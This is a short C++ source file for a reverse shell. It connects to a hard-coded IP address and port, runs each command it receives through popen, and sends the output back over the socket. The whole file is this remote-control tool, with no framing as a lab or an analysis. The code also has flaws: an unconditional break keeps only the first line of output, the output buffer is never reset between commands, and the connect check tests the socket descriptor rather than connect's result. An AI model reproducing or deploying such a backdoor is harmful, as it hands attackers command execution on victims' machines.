#include <cstdlib>
#include <iostream>
#include <cstdio>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define SERVER_PORT 3456
#define SERVER_IP "192.168.100.3"
using namespace std;
void exeCmd(const char *cmd, char *result)
{
	char buf_ps[1024];
	char ps[1024]={0};
	FILE *ptr;
	strcpy(ps, cmd);
	if((ptr=popen(ps, "r"))!=NULL)
	{
		while(fgets(buf_ps, 1024, ptr)!=NULL)
		{
		strcat(result, buf_ps);

//		if(strlen(result) > 4000)
		break;
	}
	pclose(ptr);
	ptr = NULL;

	}
	else
	{
		cout << "popen error: " << ps << endl;
	}
}
void shell(){
	int sockfd = 0;
	struct sockaddr_in serveraddr;
	char *buf_r = (char *)malloc(0x1000);
	char *buf_w = (char *)malloc(0x1000);
	int text_len = 0;
	
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	bzero(&serveraddr, sizeof(struct sockaddr_in));
	serveraddr.sin_family = AF_INET;

	inet_pton(AF_INET, SERVER_IP, &serveraddr.sin_addr);
	serveraddr.sin_port = htons(SERVER_PORT);
	
	while(true){
		cout << "connecting";
		connect(sockfd, (struct sockaddr *)&serveraddr, sizeof(serveraddr));
		if(sockfd > 0) {
		cout << "connected!";
		write(sockfd, "connected!", 0x10);
			break;
		}
	}
	while(true) {
		text_len = read(sockfd, buf_r, 0x1000 - 1);
		buf_r[text_len] = '\x00';
		if(text_len > 0) {
			exeCmd(buf_r, buf_w);
			text_len = strlen(buf_w);
			if(!strcmp(buf_r, "exit")) {
				break;
			}
			write(sockfd, buf_w, text_len + 1);
			
		}
	}
	close(sockfd);
}
int main(void) {
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	shell();
	return 0;
}
